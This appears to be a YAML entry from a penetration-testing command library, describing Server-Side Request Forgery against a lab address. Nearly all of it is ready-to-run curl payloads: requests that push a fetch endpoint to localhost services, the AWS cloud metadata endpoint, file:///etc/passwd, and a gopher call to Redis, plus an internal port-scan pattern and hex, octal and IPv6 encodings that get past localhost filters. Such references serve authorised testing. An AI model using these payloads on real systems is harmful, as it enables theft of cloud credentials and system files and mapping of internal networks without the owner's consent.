---
description: |
  Server-Side Request Forgery — trick the server into making requests
  to internal services or cloud metadata endpoints.

  Reference values:
    Target URL: http://10.10.10.1
command: |
  # Basic SSRF to internal service
  curl "http://10.10.10.1/fetch?url=http://127.0.0.1:8080"

  # Cloud metadata (AWS)
  curl "http://10.10.10.1/fetch?url=http://169.254.169.254/latest/meta-data/"

  # Internal port scan via SSRF
  curl "http://10.10.10.1/fetch?url=http://127.0.0.1:PORT"

  # File read via file://
  curl "http://10.10.10.1/fetch?url=file:///etc/passwd"

  # Gopher protocol (interact with internal services)
  curl "http://10.10.10.1/fetch?url=gopher://127.0.0.1:6379/_INFO"

  # Bypass filters
  # http://0x7f000001 (hex IP)
  # http://0177.0.0.1 (octal IP)
  # http://127.1 (short form)
  # http://[::1] (IPv6 localhost)
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Web_Injection
network_position:
  - External
  - Internal
references:
  - https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
---
